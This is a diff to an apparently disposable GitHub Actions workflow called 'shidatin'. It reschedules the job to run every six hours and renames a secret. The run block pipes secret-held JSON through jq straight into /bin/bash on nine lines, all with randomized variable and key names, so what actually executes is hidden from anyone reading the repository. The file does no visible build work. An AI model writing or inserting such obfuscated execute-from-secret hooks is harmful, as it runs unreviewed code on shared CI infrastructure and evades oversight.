@@ -1,8 +1,9 @@
 name: shidatin
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '3 4/6 * * *'
+    - cron: '32 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,15 +12,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: shidatin
         env:
-          a306: ${{ secrets.a306 }}
+          iiivc9373: ${{ secrets.iiivc9373 }}
         run: |
-          echo $a306 | jq -r .yf675 | /bin/bash
-          echo $ylxgn26818 | jq -r .vpyh32 | /bin/bash
-          echo $op77371 | jq -r .ivqdl6994 | /bin/bash
-          echo $vf401 | jq -r .hqfxx64 | /bin/bash
-          echo $uenw00 | jq -r .a93 | /bin/bash
-          echo $bs6 | jq -r .ssf40011 | /bin/bash
-          echo $szijh76 | jq -r .nez51 | /bin/bash
-          echo $o75 | jq -r .ghnu9715 | /bin/bash
-          echo $dfn16 | jq -r .vsio1 | /bin/bash
+          echo $iiivc9373 | jq -r .vf7122 | /bin/bash
+          echo $rinp47250 | jq -r .ubvq8 | /bin/bash
+          echo $zz254 | jq -r .u6843 | /bin/bash
+          echo $gf8 | jq -r .ntf3 | /bin/bash
+          echo $ljur96424 | jq -r .lb89012 | /bin/bash
+          echo $coj2482 | jq -r .trzfj568 | /bin/bash
+          echo $prfz8968 | jq -r .lkog724 | /bin/bash
+          echo $l931 | jq -r .n980 | /bin/bash
+          echo $r79 | jq -r .jtmy3 | /bin/bash
 
